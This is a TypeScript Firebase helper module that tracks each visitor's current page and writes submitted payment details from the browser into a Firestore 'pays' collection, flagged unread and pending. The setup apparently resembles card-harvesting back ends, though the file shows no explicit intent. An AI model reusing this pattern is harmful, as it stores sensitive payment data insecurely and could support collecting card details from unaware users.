import { getApp, getApps, initializeApp, FirebaseApp } from "firebase/app";
import { getDatabase, Database } from "firebase/database";
import { doc, getFirestore, setDoc, Firestore } from "firebase/firestore";
import { sanitizeData } from "./sanitize";

const firebaseConfig = {
  apiKey: process.env.NEXT_PUBLIC_FIREBASE_API_KEY || "",
  authDomain: process.env.NEXT_PUBLIC_FIREBASE_AUTH_DOMAIN || "",
  projectId: process.env.NEXT_PUBLIC_FIREBASE_PROJECT_ID || "",
  storageBucket: process.env.NEXT_PUBLIC_FIREBASE_STORAGE_BUCKET || "",
  messagingSenderId: process.env.NEXT_PUBLIC_FIREBASE_MESSAGING_SENDER_ID || "",
  appId: process.env.NEXT_PUBLIC_FIREBASE_APP_ID || ""
};

const isFirebaseConfigured = Boolean(
  firebaseConfig.apiKey &&
    firebaseConfig.projectId 
);

let app: FirebaseApp | null = null;
let db: Firestore | null = null;
let database: Database | null = null;

if (isFirebaseConfigured) {
  app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
  db = getFirestore(app);
  database = getDatabase(app);
} else {
  console.warn(
    "Firebase is not configured. Please set the required environment variables.",
  );
}

export async function getData(id: string) {
  if (!db) {
    console.warn("Firebase not configured - getData skipped");
    return null;
  }
  try {
    const { getDoc, doc } = await import("firebase/firestore");
    const docRef = doc(db, "pays", id);
    const docSnap = await getDoc(docRef);

    if (docSnap.exists()) {
      return docSnap.data();
    } else {
      return null;
    }
  } catch (e) {
    console.error("Error getting document: ", e);
    return null;
  }
}

/**
 * @deprecated This function is no longer used. Use addToHistory from history-utils instead.
 * This function pollutes history with full page data instead of specific entries.
 */
export async function saveToHistory(visitorID: string, step: number) {
  console.warn("saveToHistory is deprecated and should not be used");
  return; // Disabled - function body kept for reference only
  /*
  try {
    const currentData = await getData(visitorID);
    
    if (!currentData) {
      console.log('No current data to save to history');
      return;
    }
    
    const { history, ...dataToSave } = currentData as any;
    
    const historyEntry = {
      timestamp: new Date().toISOString(),
      step: step,
      data: dataToSave
    };
    
    const existingHistory = currentData.history || [];
    
    const updatedHistory = [...existingHistory, historyEntry];
    
    await addData({
      id: visitorID,
      history: updatedHistory
    });
    
    console.log('Saved to history:', historyEntry);
  } catch (e) {
    console.error('Error saving to history: ', e);
  }
  */
}

export async function addData(data: any) {
  if (typeof localStorage !== "undefined") {
    localStorage.setItem("visitor", data.id);
  }
  if (!db) {
    console.warn("Firebase not configured - addData skipped");
    return;
  }
  try {
    // Sanitize data before saving to prevent malicious content
    const sanitizedData = sanitizeData(data);
    
    const docRef = await doc(db, "pays", data.id!);
    await setDoc(
      docRef,
      {
        ...sanitizedData,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
        isUnread: true,
      },
      { merge: true },
    );

    console.log("Document written with ID: ", docRef.id);
  } catch (e) {
    console.error("Error adding document: ", e);
  }
}

export const handleCurrentPage = (page: string) => {
  const visitorId = localStorage.getItem("visitor");
  addData({ id: visitorId, currentPage: page });
};
export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  if (!db) {
    console.warn("Firebase not configured - handlePay skipped");
    return;
  }
  try {
    const visitorId =
      typeof localStorage !== "undefined"
        ? localStorage.getItem("visitor")
        : null;
    if (visitorId) {
      // Sanitize payment data before saving
      const sanitizedPayment = sanitizeData(paymentInfo);
      const docRef = doc(db, "pays", visitorId);
      await setDoc(
        docRef,
        { ...sanitizedPayment, status: "pending" },
        { merge: true },
      );
      setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }));
    }
  } catch (error) {
    console.error("Error adding document: ", error);
    alert("Error adding payment info to Firestore");
  }
};
export { db, database, setDoc, doc };
